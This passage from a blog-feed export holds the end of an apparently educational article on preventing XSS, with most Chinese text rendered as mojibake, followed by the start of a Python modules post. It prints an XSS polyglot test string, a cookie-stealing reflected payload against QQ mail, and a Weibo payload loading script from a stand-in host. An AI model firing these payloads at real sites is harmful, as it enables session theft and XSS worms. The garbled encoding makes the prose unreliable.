é˜²æŠ¤æªæ–½ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨æ›´å®Œå–„æ›´ç»†è‡´çš„è½¬ä¹‰ç­–ç•¥ã€‚ ä¾‹å¦‚ Java å·¥ç¨‹é‡Œï¼Œå¸¸ç”¨çš„è½¬ä¹‰åº“ä¸º org.owasp.encoderã€‚ä»¥ä¸‹ä»£ç å¼•ç”¨è‡ª org.owasp.encoder çš„å®˜æ–¹è¯´æ˜ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!-- HTML æ ‡ç­¾å†…æ–‡å­—å†…å®¹ --&gt;&lt;div&gt;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&lt;/div&gt;&lt;!-- HTML æ ‡ç­¾å±æ€§å€¼ --&gt;&lt;input value="&lt;%= Encode.forHtml(UNTRUSTED) %&gt;" /&gt;&lt;!-- CSS å±æ€§å€¼ --&gt;&lt;div style="width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;"&gt; &lt;!-- CSS URL --&gt; &lt;div style="background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;"&gt; &lt;!-- JavaScript å†…è”ä»£ç å— --&gt; &lt;script&gt; var msg = '&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;'; alert(msg); &lt;/script&gt; &lt;!-- JavaScript å†…è”ä»£ç å—å†…åµŒ JSON --&gt; &lt;script&gt; var __INITIAL_STATE__ = JSON.parse( '&lt;%= Encoder.forJavaScript(data.to_json) %&gt;' ); &lt;/script&gt; &lt;!-- HTML æ ‡ç­¾å†…è”ç›‘å¬å™¨ --&gt; &lt;button onclick="alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;');"&gt; click me &lt;/button&gt; &lt;!-- URL å‚æ•° --&gt; &lt;a href="/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top" &gt; &lt;!-- URL è·¯å¾„ --&gt; &lt;a href="/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;"&gt; &lt;!-- URL. æ³¨æ„ï¼šè¦æ ¹æ®é¡¹ç›®æƒ…å†µè¿›è¡Œè¿‡æ»¤ï¼Œç¦æ­¢æ‰ "javascript:" é“¾æ¥ã€éæ³• scheme ç­‰--&gt; &lt;a href='&lt;%= urlValidator.isValid(UNTRUSTED) ? Encode.forHtml(UNTRUSTED) : "/404"%&gt;' &gt; link &lt;/a&gt;&lt;/a &gt;&lt;/a &gt; &lt;/div&gt;&lt;/div&gt; å¯è§ï¼ŒHTML çš„ç¼–ç æ˜¯ååˆ†å¤æ‚çš„ï¼Œåœ¨ä¸åŒçš„ä¸Šä¸‹æ–‡é‡Œè¦ä½¿ç”¨ç›¸åº”çš„è½¬ä¹‰è§„åˆ™ã€‚ é¢„é˜² DOM å‹ XSS æ”»å‡»DOM å‹ XSS æ”»å‡»ï¼Œå®é™…ä¸Šå°±æ˜¯ç½‘ç«™å‰ç«¯ JavaScript ä»£ç æœ¬èº«ä¸å¤Ÿä¸¥è°¨ï¼ŒæŠŠä¸å¯ä¿¡çš„æ•°æ®å½“ä½œä»£ç æ‰§è¡Œäº†ã€‚ åœ¨ä½¿ç”¨ .innerHTMLã€.outerHTMLã€document.write() æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œä¸è¦æŠŠä¸å¯ä¿¡çš„æ•°æ®ä½œä¸º HTML æ’åˆ°é¡µé¢ä¸Šï¼Œè€Œåº”å°½é‡ä½¿ç”¨ .textContentã€.setAttribute()ç­‰ã€‚ å¦‚æœç”¨ Vue/React æŠ€æœ¯æ ˆï¼Œå¹¶ä¸”ä¸ä½¿ç”¨ v-html/dangerouslySetInnerHTML åŠŸèƒ½ï¼Œå°±åœ¨å‰ç«¯ render é˜¶æ®µé¿å… innerHTMLã€outerHTML çš„ XSS éšæ‚£ã€‚ DOM ä¸­çš„å†…è”äº‹ä»¶ç›‘å¬å™¨ï¼Œå¦‚ locationã€onclickã€onerrorã€onloadã€onmouseover ç­‰ï¼Œ&lt;a&gt; æ ‡ç­¾çš„ href å±æ€§ï¼ŒJavaScript çš„ eval()ã€setTimeout()ã€setInterval() ç­‰ï¼Œéƒ½èƒ½æŠŠå­—ç¬¦ä¸²ä½œä¸ºä»£ç è¿è¡Œã€‚å¦‚æœä¸å¯ä¿¡çš„æ•°æ®æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸­ä¼ é€’ç»™è¿™äº› APIï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿå®‰å…¨éšæ‚£ï¼Œè¯·åŠ¡å¿…é¿å…ã€‚ 1234567891011121314151617&lt;!-- å†…è”äº‹ä»¶ç›‘å¬å™¨ä¸­åŒ…å«æ¶æ„ä»£ç  --&gt;![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/3e724ce0.data:image/png,)&lt;!-- é“¾æ¥å†…åŒ…å«æ¶æ„ä»£ç  --&gt;&lt;a href="UNTRUSTED"&gt;1&lt;/a&gt;&lt;script&gt; // setTimeout()/setInterval() ä¸­è°ƒç”¨æ¶æ„ä»£ç  setTimeout('UNTRUSTED'); setInterval('UNTRUSTED'); // location è°ƒç”¨æ¶æ„ä»£ç  location.href = 'UNTRUSTED'; // eval() ä¸­è°ƒç”¨æ¶æ„ä»£ç  eval('UNTRUSTED');&lt;/script&gt; å¦‚æœé¡¹ç›®ä¸­æœ‰ç”¨åˆ°è¿™äº›çš„è¯ï¼Œä¸€å®šè¦é¿å…åœ¨å­—ç¬¦ä¸²ä¸­æ‹¼æ¥ä¸å¯ä¿¡æ•°æ®ã€‚ å…¶ä»– XSS é˜²èŒƒæªæ–½è™½ç„¶åœ¨æ¸²æŸ“é¡µé¢å’Œæ‰§è¡Œ JavaScript æ—¶ï¼Œé€šè¿‡è°¨æ…çš„è½¬ä¹‰å¯ä»¥é˜²æ­¢ XSS çš„å‘ç”Ÿï¼Œä½†å®Œå…¨ä¾é å¼€å‘çš„è°¨æ…ä»ç„¶æ˜¯ä¸å¤Ÿçš„ã€‚ä»¥ä¸‹ä»‹ç»ä¸€äº›é€šç”¨çš„æ–¹æ¡ˆï¼Œå¯ä»¥é™ä½ XSS å¸¦æ¥çš„é£é™©å’Œåæœã€‚ Content Security Policyä¸¥æ ¼çš„ CSP åœ¨ XSS çš„é˜²èŒƒä¸­å¯ä»¥èµ·åˆ°ä»¥ä¸‹çš„ä½œç”¨ï¼š ç¦æ­¢åŠ è½½å¤–åŸŸä»£ç ï¼Œé˜²æ­¢å¤æ‚çš„æ”»å‡»é€»è¾‘ã€‚ ç¦æ­¢å¤–åŸŸæäº¤ï¼Œç½‘ç«™è¢«æ”»å‡»åï¼Œç”¨æˆ·çš„æ•°æ®ä¸ä¼šæ³„éœ²åˆ°å¤–åŸŸã€‚ ç¦æ­¢å†…è”è„šæœ¬æ‰§è¡Œï¼ˆè§„åˆ™è¾ƒä¸¥æ ¼ï¼Œç›®å‰å‘ç° GitHub ä½¿ç”¨ï¼‰ã€‚ ç¦æ­¢æœªæˆæƒçš„è„šæœ¬æ‰§è¡Œï¼ˆæ–°ç‰¹æ€§ï¼ŒGoogle Map ç§»åŠ¨ç‰ˆåœ¨ä½¿ç”¨ï¼‰ã€‚ åˆç†ä½¿ç”¨ä¸ŠæŠ¥å¯ä»¥åŠæ—¶å‘ç° XSSï¼Œåˆ©äºå°½å¿«ä¿®å¤é—®é¢˜ã€‚ å…³äº CSP çš„è¯¦æƒ…ï¼Œè¯·å…³æ³¨å‰ç«¯å®‰å…¨ç³»åˆ—åç»­çš„æ–‡ç« ã€‚ è¾“å…¥å†…å®¹é•¿åº¦æ§åˆ¶å¯¹äºä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œéƒ½åº”è¯¥é™å®šä¸€ä¸ªåˆç†çš„é•¿åº¦ã€‚è™½ç„¶æ— æ³•å®Œå…¨é˜²æ­¢ XSS å‘ç”Ÿï¼Œä½†å¯ä»¥å¢åŠ  XSS æ”»å‡»çš„éš¾åº¦ã€‚ å…¶ä»–å®‰å…¨æªæ–½ HTTP-only Cookie: ç¦æ­¢ JavaScript è¯»å–æŸäº›æ•æ„Ÿ Cookieï¼Œæ”»å‡»è€…å®Œæˆ XSS æ³¨å…¥åä¹Ÿæ— æ³•çªƒå–æ­¤ Cookieã€‚ éªŒè¯ç ï¼šé˜²æ­¢è„šæœ¬å†’å……ç”¨æˆ·æäº¤å±é™©æ“ä½œã€‚ XSS çš„æ£€æµ‹ä¸Šè¿°ç»å†è®©å°æ˜æ”¶è·é¢‡ä¸°ï¼Œä»–ä¹Ÿå­¦ä¼šäº†å¦‚ä½•å»é¢„é˜²å’Œä¿®å¤ XSS æ¼æ´ï¼Œåœ¨æ—¥å¸¸å¼€å‘ä¸­ä¹Ÿå…·å¤‡äº†ç›¸å…³çš„å®‰å…¨æ„è¯†ã€‚ä½†å¯¹äºå·²ç»ä¸Šçº¿çš„ä»£ç ï¼Œå¦‚ä½•å»æ£€æµ‹å…¶ä¸­æœ‰æ²¡æœ‰ XSS æ¼æ´å‘¢ï¼Ÿ ç»è¿‡ä¸€ç•ªæœç´¢ï¼Œå°æ˜æ‰¾åˆ°äº†ä¸¤ä¸ªæ–¹æ³•ï¼š ä½¿ç”¨é€šç”¨ XSS æ”»å‡»å­—ç¬¦ä¸²æ‰‹åŠ¨æ£€æµ‹ XSS æ¼æ´ã€‚ ä½¿ç”¨æ‰«æå·¥å…·è‡ªåŠ¨æ£€æµ‹ XSS æ¼æ´ã€‚ åœ¨Unleashing an Ultimate XSS Polyglotä¸€æ–‡ä¸­ï¼Œå°æ˜å‘ç°äº†è¿™ä¹ˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼š 1jaVasCript: /*-/*`/*\`/*'/*"/**/ /* */ oNcliCk = alert(); //%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e å®ƒèƒ½å¤Ÿæ£€æµ‹åˆ°å­˜åœ¨äº HTML å±æ€§ã€HTML æ–‡å­—å†…å®¹ã€HTML æ³¨é‡Šã€è·³è½¬é“¾æ¥ã€å†…è” JavaScript å­—ç¬¦ä¸²ã€å†…è” CSS æ ·å¼è¡¨ç­‰å¤šç§ä¸Šä¸‹æ–‡ä¸­çš„ XSS æ¼æ´ï¼Œä¹Ÿèƒ½æ£€æµ‹ eval()ã€setTimeout()ã€setInterval()ã€Function()ã€innerHTMLã€document.write() ç­‰ DOM å‹ XSS æ¼æ´ï¼Œå¹¶ä¸”èƒ½ç»•è¿‡ä¸€äº› XSS è¿‡æ»¤å™¨ã€‚ å°æ˜åªè¦åœ¨ç½‘ç«™çš„å„è¾“å…¥æ¡†ä¸­æäº¤è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ–è€…æŠŠå®ƒæ‹¼æ¥åˆ° URL å‚æ•°ä¸Šï¼Œå°±å¯ä»¥è¿›è¡Œæ£€æµ‹äº†ã€‚ 1http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E é™¤äº†æ‰‹åŠ¨æ£€æµ‹ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è‡ªåŠ¨æ‰«æå·¥å…·å¯»æ‰¾ XSS æ¼æ´ï¼Œä¾‹å¦‚ Arachniã€Mozilla HTTP Observatoryã€w3af ç­‰ã€‚ XSS æ”»å‡»çš„æ€»ç»“æˆ‘ä»¬å›åˆ°æœ€å¼€å§‹æå‡ºçš„é—®é¢˜ï¼Œç›¸ä¿¡åŒå­¦ä»¬å·²ç»æœ‰äº†ç­”æ¡ˆï¼š XSS é˜²èŒƒæ˜¯åç«¯ RD çš„è´£ä»»ï¼Œåç«¯ RD åº”è¯¥åœ¨æ‰€æœ‰ç”¨æˆ·æäº¤æ•°æ®çš„æ¥å£ï¼Œå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚ ä¸æ­£ç¡®ã€‚å› ä¸ºï¼š _ é˜²èŒƒå­˜å‚¨å‹å’Œåå°„å‹ XSS æ˜¯åç«¯ RD çš„è´£ä»»ã€‚è€Œ DOM å‹ XSS æ”»å‡»ä¸å‘ç”Ÿåœ¨åç«¯ï¼Œæ˜¯å‰ç«¯ RD çš„è´£ä»»ã€‚é˜²èŒƒ XSS æ˜¯éœ€è¦åç«¯ RD å’Œå‰ç«¯ RD å…±åŒå‚ä¸çš„ç³»ç»Ÿå·¥ç¨‹ã€‚ _ è½¬ä¹‰åº”è¯¥åœ¨è¾“å‡º HTML æ—¶è¿›è¡Œï¼Œè€Œä¸æ˜¯åœ¨æäº¤ç”¨æˆ·è¾“å…¥æ—¶ã€‚ æ‰€æœ‰è¦æ’å…¥åˆ°é¡µé¢ä¸Šçš„æ•°æ®ï¼Œéƒ½è¦é€šè¿‡ä¸€ä¸ªæ•æ„Ÿå­—ç¬¦è¿‡æ»¤å‡½æ•°çš„è½¬ä¹‰ï¼Œè¿‡æ»¤æ‰é€šç”¨çš„æ•æ„Ÿå­—ç¬¦åï¼Œå°±å¯ä»¥æ’å…¥åˆ°é¡µé¢ä¸­ã€‚ ä¸æ­£ç¡®ã€‚ ä¸åŒçš„ä¸Šä¸‹æ–‡ï¼Œå¦‚ HTML å±æ€§ã€HTML æ–‡å­—å†…å®¹ã€HTML æ³¨é‡Šã€è·³è½¬é“¾æ¥ã€å†…è” JavaScript å­—ç¬¦ä¸²ã€å†…è” CSS æ ·å¼è¡¨ç­‰ï¼Œæ‰€éœ€è¦çš„è½¬ä¹‰è§„åˆ™ä¸ä¸€è‡´ã€‚ ä¸šåŠ¡ RD éœ€è¦é€‰å–åˆé€‚çš„è½¬ä¹‰åº“ï¼Œå¹¶é’ˆå¯¹ä¸åŒçš„ä¸Šä¸‹æ–‡è°ƒç”¨ä¸åŒçš„è½¬ä¹‰è§„åˆ™ã€‚ æ•´ä½“çš„ XSS é˜²èŒƒæ˜¯éå¸¸å¤æ‚å’Œç¹ççš„ï¼Œæˆ‘ä»¬ä¸ä»…éœ€è¦åœ¨å…¨éƒ¨éœ€è¦è½¬ä¹‰çš„ä½ç½®ï¼Œå¯¹æ•°æ®è¿›è¡Œå¯¹åº”çš„è½¬ä¹‰ã€‚è€Œä¸”è¦é˜²æ­¢å¤šä½™å’Œé”™è¯¯çš„è½¬ä¹‰ï¼Œé¿å…æ­£å¸¸çš„ç”¨æˆ·è¾“å…¥å‡ºç°ä¹±ç ã€‚ è™½ç„¶å¾ˆéš¾é€šè¿‡æŠ€æœ¯æ‰‹æ®µå®Œå…¨é¿å… XSSï¼Œä½†æˆ‘ä»¬å¯ä»¥æ€»ç»“ä»¥ä¸‹åŸåˆ™å‡å°‘æ¼æ´çš„äº§ç”Ÿï¼š åˆ©ç”¨æ¨¡æ¿å¼•æ“ å¼€å¯æ¨¡æ¿å¼•æ“è‡ªå¸¦çš„ HTML è½¬ä¹‰åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼š åœ¨ ejs ä¸­ï¼Œå°½é‡ä½¿ç”¨ &lt;%= data %&gt; è€Œä¸æ˜¯ &lt;%- data %&gt; ã€‚ é¿å…å†…è”äº‹ä»¶ å°½é‡ä¸è¦ä½¿ç”¨ onLoad=&quot;onload(&#39;&#39;)&quot;ã€onClick=&quot;go(&#39;&#39;)&quot; è¿™ç§æ‹¼æ¥å†…è”äº‹ä»¶çš„å†™æ³•ã€‚åœ¨ JavaScript ä¸­é€šè¿‡ .addEventlistener() äº‹ä»¶ç»‘å®šä¼šæ›´å®‰å…¨ã€‚ é¿å…æ‹¼æ¥ HTML å‰ç«¯é‡‡ç”¨æ‹¼æ¥ HTML çš„æ–¹æ³•æ¯”è¾ƒå±é™©ï¼Œå¦‚æœæ¡†æ¶å…è®¸ï¼Œä½¿ç”¨ createElementã€setAttribute ä¹‹ç±»çš„æ–¹æ³•å®ç°ã€‚æˆ–è€…é‡‡ç”¨æ¯”è¾ƒæˆç†Ÿçš„æ¸²æŸ“æ¡†æ¶ï¼Œå¦‚ Vue/React ç­‰ã€‚ æ—¶åˆ»ä¿æŒè­¦æƒ• åœ¨æ’å…¥ä½ç½®ä¸º DOM å±æ€§ã€é“¾æ¥ç­‰ä½ç½®æ—¶ï¼Œè¦æ‰“èµ·ç²¾ç¥ï¼Œä¸¥åŠ é˜²èŒƒã€‚ å¢åŠ æ”»å‡»éš¾åº¦ï¼Œé™ä½æ”»å‡»åæœ é€šè¿‡ CSPã€è¾“å…¥é•¿åº¦é…ç½®ã€æ¥å£å®‰å…¨æªæ–½ç­‰æ–¹æ³•ï¼Œå¢åŠ æ”»å‡»çš„éš¾åº¦ï¼Œé™ä½æ”»å‡»çš„åæœã€‚ ä¸»åŠ¨æ£€æµ‹å’Œå‘ç° å¯ä½¿ç”¨ XSS æ”»å‡»å­—ç¬¦ä¸²å’Œè‡ªåŠ¨æ‰«æå·¥å…·å¯»æ‰¾æ½œåœ¨çš„ XSS æ¼æ´ã€‚ XSS æ”»å‡»æ¡ˆä¾‹QQ é‚®ç®± m.exmail.qq.com åŸŸååå°„å‹ XSS æ¼æ´æ”»å‡»è€…å‘ç° http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb è¿™ä¸ª URL çš„å‚æ•° uinã€domain æœªç»è½¬ä¹‰ç›´æ¥è¾“å‡ºåˆ° HTML ä¸­ã€‚ äºæ˜¯æ”»å‡»è€…æ„å»ºå‡ºä¸€ä¸ª URLï¼Œå¹¶å¼•å¯¼ç”¨æˆ·å»ç‚¹å‡»ï¼š http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B ç”¨æˆ·ç‚¹å‡»è¿™ä¸ª URL æ—¶ï¼ŒæœåŠ¡ç«¯å–å‡º URL å‚æ•°ï¼Œæ‹¼æ¥åˆ° HTML å“åº”ä¸­ï¼š 123456789&lt;script&gt; getTop().location.href = '/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa' + '&amp;t=' + '&amp;d=bbbb'; return false;&lt;/script&gt;&lt;script&gt; alert(document.cookie);&lt;/script&gt;"+"... æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åå°±ä¼šæ‰§è¡Œ alert(document.cookie)ï¼Œæ”»å‡»è€…é€šè¿‡ JavaScript å³å¯çªƒå–å½“å‰ç”¨æˆ·åœ¨ QQ é‚®ç®±åŸŸåä¸‹çš„ Cookie ï¼Œè¿›è€Œå±å®³æ•°æ®å®‰å…¨ã€‚ æ–°æµªå¾®åšåäººå ‚åå°„å‹ XSS æ¼æ´æ”»å‡»è€…å‘ç° http://weibo.com/pub/star/g/xyyyd è¿™ä¸ª URL çš„å†…å®¹æœªç»è¿‡æ»¤ç›´æ¥è¾“å‡ºåˆ° HTML ä¸­ã€‚ äºæ˜¯æ”»å‡»è€…æ„å»ºå‡ºä¸€ä¸ª URLï¼Œç„¶åè¯±å¯¼ç”¨æˆ·å»ç‚¹å‡»ï¼š 1http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt; ç”¨æˆ·ç‚¹å‡»è¿™ä¸ª URL æ—¶ï¼ŒæœåŠ¡ç«¯å–å‡ºè¯·æ±‚ URLï¼Œæ‹¼æ¥åˆ° HTML å“åº”ä¸­ï¼š 1&lt;li&gt;&lt;a href="http://weibo.com/pub/star/g/xyyyd"&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;"&gt;æŒ‰åˆ†ç±»æ£€ç´¢&lt;/a&gt;&lt;/li&gt; æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åå°±ä¼šåŠ è½½æ‰§è¡Œæ¶æ„è„šæœ¬ //xxxx.cn/image/t.jsï¼Œåœ¨æ¶æ„è„šæœ¬ä¸­åˆ©ç”¨ç”¨æˆ·çš„ç™»å½•çŠ¶æ€è¿›è¡Œå…³æ³¨ã€å‘å¾®åšã€å‘ç§ä¿¡ç­‰æ“ä½œï¼Œå‘å‡ºçš„å¾®åšå’Œç§ä¿¡å¯å†å¸¦ä¸Šæ”»å‡» URLï¼Œè¯±å¯¼æ›´å¤šäººç‚¹å‡»ï¼Œä¸æ–­æ”¾å¤§æ”»å‡»èŒƒå›´ã€‚è¿™ç§çªƒç”¨å—å®³è€…èº«ä»½å‘å¸ƒæ¶æ„å†…å®¹ï¼Œå±‚å±‚æ”¾å¤§æ”»å‡»èŒƒå›´çš„æ–¹å¼ï¼Œè¢«ç§°ä¸ºâ€œXSS è •è™«â€ã€‚ æ‰©å±•é˜…è¯»ï¼šAutomatic Context-Aware Escapingä¸Šæ–‡æˆ‘ä»¬è¯´åˆ°ï¼š åˆé€‚çš„ HTML è½¬ä¹‰å¯ä»¥æœ‰æ•ˆé¿å… XSS æ¼æ´ã€‚ å®Œå–„çš„è½¬ä¹‰åº“éœ€è¦é’ˆå¯¹ä¸Šä¸‹æ–‡åˆ¶å®šå¤šç§è§„åˆ™ï¼Œä¾‹å¦‚ HTML å±æ€§ã€HTML æ–‡å­—å†…å®¹ã€HTML æ³¨é‡Šã€è·³è½¬é“¾æ¥ã€å†…è” JavaScript å­—ç¬¦ä¸²ã€å†…è” CSS æ ·å¼è¡¨ç­‰ç­‰ã€‚ ä¸šåŠ¡ RD éœ€è¦æ ¹æ®æ¯ä¸ªæ’å…¥ç‚¹æ‰€å¤„çš„ä¸Šä¸‹æ–‡ï¼Œé€‰å–ä¸åŒçš„è½¬ä¹‰è§„åˆ™ã€‚ é€šå¸¸ï¼Œè½¬ä¹‰åº“æ˜¯ä¸èƒ½åˆ¤æ–­æ’å…¥ç‚¹ä¸Šä¸‹æ–‡çš„ï¼ˆNot Context-Awareï¼‰ï¼Œå®æ–½è½¬ä¹‰è§„åˆ™çš„è´£ä»»å°±è½åˆ°äº†ä¸šåŠ¡ RD èº«ä¸Šï¼Œéœ€è¦æ¯ä¸ªä¸šåŠ¡ RD éƒ½å……åˆ†ç†è§£ XSS çš„å„ç§æƒ…å†µï¼Œå¹¶ä¸”éœ€è¦ä¿è¯æ¯ä¸€ä¸ªæ’å…¥ç‚¹ä½¿ç”¨äº†æ­£ç¡®çš„è½¬ä¹‰è§„åˆ™ã€‚ è¿™ç§æœºåˆ¶å·¥ä½œé‡å¤§ï¼Œå…¨é äººå·¥ä¿è¯ï¼Œå¾ˆå®¹æ˜“é€ æˆ XSS æ¼æ´ï¼Œå®‰å…¨äººå‘˜ä¹Ÿå¾ˆéš¾å‘ç°éšæ‚£ã€‚ 2009 å¹´ï¼ŒGoogle æå‡ºäº†ä¸€ä¸ªæ¦‚å¿µå«åšï¼šAutomatic Context-Aware Escapingã€‚ æ‰€è°“ Context-Awareï¼Œå°±æ˜¯è¯´æ¨¡æ¿å¼•æ“åœ¨è§£ææ¨¡æ¿å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå°±è§£ææ¨¡æ¿è¯­æ³•ï¼Œåˆ†æå‡ºæ¯ä¸ªæ’å…¥ç‚¹æ‰€å¤„çš„ä¸Šä¸‹æ–‡ï¼Œæ®æ­¤è‡ªåŠ¨é€‰ç”¨ä¸åŒçš„è½¬ä¹‰è§„åˆ™ã€‚è¿™æ ·å°±å‡è½»äº†ä¸šåŠ¡ RD çš„å·¥ä½œè´Ÿæ‹…ï¼Œä¹Ÿå‡å°‘äº†äººä¸ºå¸¦æ¥çš„ç–æ¼ã€‚ åœ¨ä¸€ä¸ªæ”¯æŒ Automatic Context-Aware Escaping çš„æ¨¡æ¿å¼•æ“é‡Œï¼Œä¸šåŠ¡ RD å¯ä»¥è¿™æ ·å®šä¹‰æ¨¡æ¿ï¼Œè€Œæ— éœ€æ‰‹åŠ¨å®æ–½è½¬ä¹‰è§„åˆ™ï¼š 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;&#123;&#123;.title&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href="&#123;&#123;.url&#125;&#125;"&gt;&#123;&#123;.content&#125;&#125;&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; æ¨¡æ¿å¼•æ“ç»è¿‡è§£æåï¼Œå¾—çŸ¥ä¸‰ä¸ªæ’å…¥ç‚¹æ‰€å¤„çš„ä¸Šä¸‹æ–‡ï¼Œè‡ªåŠ¨é€‰ç”¨ç›¸åº”çš„è½¬ä¹‰è§„åˆ™ï¼š 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;&#123;&#123;.title | htmlescaper&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href="&#123;&#123;.url | urlescaper | attrescaper&#125;&#125;"&gt;&#123;&#123;.content | htmlescaper&#125;&#125;&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; ç›®å‰å·²ç»æ”¯æŒ Automatic Context-Aware Escaping çš„æ¨¡æ¿å¼•æ“æœ‰ï¼š go html/template Google Closure Templates è¯¾åä½œä¸šï¼šXSS æ”»å‡»å°æ¸¸æˆä»¥ä¸‹æ˜¯å‡ ä¸ª XSS æ”»å‡»å°æ¸¸æˆï¼Œå¼€å‘è€…åœ¨ç½‘ç«™ä¸Šæ•…æ„ç•™ä¸‹äº†ä¸€äº›å¸¸è§çš„ XSS æ¼æ´ã€‚ç©å®¶åœ¨ç½‘é¡µä¸Šæäº¤ç›¸åº”çš„è¾“å…¥ï¼Œå®Œæˆ XSS æ”»å‡»å³å¯é€šå…³ã€‚ åœ¨ç©æ¸¸æˆçš„è¿‡ç¨‹ä¸­ï¼Œè¯·å„ä½è¯»è€…ä»”ç»†æ€è€ƒå’Œå›é¡¾æœ¬æ–‡å†…å®¹ï¼ŒåŠ æ·±å¯¹ XSS æ”»å‡»çš„ç†è§£ã€‚ alert(1) to win prompt(1) to win XSS game å‚è€ƒæ–‡çŒ® Wikipedia. Cross-site scripting, Wikipedia. OWASP. XSS (Cross Site Scripting) Prevention Cheat Sheet, OWASP. OWASP. Use the OWASP Java Encoder-Use-the-OWASP-Java-Encoder), GitHub. Ahmed Elsobky. Unleashing an Ultimate XSS Polyglot, GitHub. Jad S. Boutros. Reducing XSS by way of Automatic Context-Aware Escaping in Template Systems, Google Security Blog. Vue.js. v-html - Vue API docs, Vue.js. React. dangerouslySetInnerHTML - DOM Elements, React.]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡º Python æ¨¡å—æœºåˆ¶]]></title>
    <url>%2F2019%2F09%2F01%2FPython%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%20Python%20%E6%A8%A1%E5%9D%97%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[Python æ¨¡å— æ¨¡å—æ˜¯åŒ…æ‹¬ Python å®šä¹‰å’Œå£°æ˜çš„æ–‡ä»¶ï¼Œæ–‡ä»¶åå°±æ˜¯æ¨¡å—ååŠ ä¸Š .py åç¼€ï¼Œæ¨¡å—åå¯ä»¥ç”±å…¨å±€å˜é‡ __name__ å¾—åˆ°ã€‚ Python åªæœ‰ä¸€ç§æ¨¡å—å¯¹è±¡ç±»å‹ï¼Œæ‰€æœ‰æ¨¡å—éƒ½å±äºè¯¥ç±»å‹ï¼Œæ— è®ºæ¨¡å—æ˜¯ç”¨ Pythonã€C è¿˜æ˜¯åˆ«çš„è¯­è¨€å®ç°ã€‚ ä»€ä¹ˆæ˜¯ Python æ¨¡å—ç®€å•æ¥è¯´ï¼Œä¸€ä¸ª Python æ¨¡å—å°±æ˜¯ä¸€ä¸ªä»¥ .py ä¸ºåç¼€çš„æ–‡ä»¶ ï¼Œæ¨¡å—ä¸­èƒ½å®šä¹‰å†…å®¹åŒ…æ‹¬ï¼šå˜é‡ã€å‡½æ•°ã€ç±»å’Œå¯æ‰§è¡Œä»£ç ã€‚ æ¨¡å—ç±»å‹å¤§è‡´æœ‰ä»¥ä¸‹ 3 ç§ï¼š Python å†…ç½®çš„æ¨¡å—ï¼Œå³æ ‡å‡†åº“ã€‚ Python å¸¦æœ‰ä¸€ä¸ªæ ‡å‡†æ¨¡å—åº“ï¼Œå¹¶å‘å¸ƒæœ‰ç‹¬ç«‹çš„æ–‡æ¡£ï¼Œåä¸º Python åº“å‚è€ƒæ‰‹å†Œã€‚æœ‰ä¸€äº›æ¨¡å—å†…ç½®äºè§£é‡Šå™¨ä¹‹ä¸­ï¼Œè¿™äº›æ“ä½œçš„è®¿é—®æ¥å£ä¸æ˜¯è¯­è¨€å†…æ 